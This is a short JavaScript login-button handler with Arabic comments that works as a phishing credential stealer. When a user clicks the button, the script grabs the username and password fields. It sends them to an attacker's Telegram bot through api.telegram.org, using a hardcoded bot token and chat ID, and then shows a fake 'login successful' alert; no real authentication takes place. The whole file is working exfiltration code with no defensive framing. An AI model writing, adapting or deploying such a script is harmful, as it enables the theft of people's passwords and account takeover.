document.getElementById("loginButton").addEventListener("click", function(event) {
    event.preventDefault(); // منع تحديث الصفحة

    // استخراج بيانات المستخدم
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    // تحقق إذا كانت البيانات موجودة
    if (username && password) {
        // إعداد بيانات الرسالة
        let botToken = "7664974744:AAG0ueJAEKAs7d8e2Yr48MifjmEBm093bV8"; // ضع توكن البوت هنا
        let chatId = "7643313499"; // ضع chat_id هنا
        let message = 🔥 تسجيل دخول جديد 🔥\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password};

        // إرسال البيانات إلى Telegram
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert("تم تسجيل الدخول بنجاح!");
                } else {
                    alert("فشل تسجيل الدخول.");
                }
            })
            .catch(error => console.error("خطأ:", error));
    } else {
        alert("يرجى إدخال كل البيانات.");
    }
});
